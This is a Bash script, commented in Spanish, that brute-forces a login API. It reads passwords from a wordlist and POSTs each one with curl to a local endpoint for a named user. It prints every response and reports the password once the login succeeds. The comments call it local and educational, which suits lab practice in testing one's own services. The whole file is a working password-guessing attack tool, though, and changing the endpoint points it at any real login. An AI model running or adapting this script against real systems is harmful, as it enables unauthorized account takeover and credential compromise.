#!/usr/bin/env bash
# brute.sh — fuerza bruta controlada con wordlist (solo local, educativo)

API_ENDPOINT="http://127.0.0.1:8000/login"   # cambia si tu ruta no es /login
TARGET_USERNAME="wilian"                      # cámbialo a "admin" u otro usuario si quieres
WORDLIST_FILE="wordlist.txt"                  # archivo con una contraseña por línea

PAUSE_SECONDS="0.1"    # pausa entre intentos
ATTEMPT_LIMIT=""       # por ejemplo: 10000 (vacío = sin límite)

total_attempts=0
start_time=$(date +%s)

if [ ! -f "$WORDLIST_FILE" ]; then
  echo "No existe: $WORDLIST_FILE"
  exit 3
fi

try_password() {
  local password_guess="$1"
  total_attempts=$((total_attempts + 1))

  # cortar si hay límite configurado
  if [[ -n "$ATTEMPT_LIMIT" && "$total_attempts" -gt "$ATTEMPT_LIMIT" ]]; then
    local end_time elapsed_seconds
    end_time=$(date +%s)
    elapsed_seconds=$((end_time - start_time))
    echo "Se alcanzó ATTEMPT_LIMIT=$ATTEMPT_LIMIT"
    echo "Intentos: $total_attempts"
    echo "Tiempo: ${elapsed_seconds}s"
    exit 2
  fi

  local request_body response
  request_body=$(printf '{"username":"%s","password":"%s"}' "$TARGET_USERNAME" "$password_guess")

  response=$(curl -s -X POST "$API_ENDPOINT" \
    -H "accept: application/json" \
    -H "Content-Type: application/json" \
    -d "$request_body")

  echo "[#${total_attempts}] '$password_guess' -> $response"

  if grep -q '"ok":[[:space:]]*true' <<<"$response" && grep -q 'login successful' <<<"$response"; then
    local end_time elapsed_seconds
    end_time=$(date +%s)
    elapsed_seconds=$((end_time - start_time))
    echo "Password encontrada: $password_guess"
    echo "Intentos: $total_attempts"
    echo "Tiempo: ${elapsed_seconds}s"
    exit 0
  fi

  sleep "$PAUSE_SECONDS"
}

# Leer cada línea de wordlist.txt tal cual (una contraseña por línea)
while read -r password_candidate; do
  try_password "$password_candidate"
done < "$WORDLIST_FILE"

end_time=$(date +%s)
echo "Password NO encontrada en la wordlist"
echo "Intentos: $total_attempts"
echo "Tiempo: $((end_time - start_time))s"
exit 1

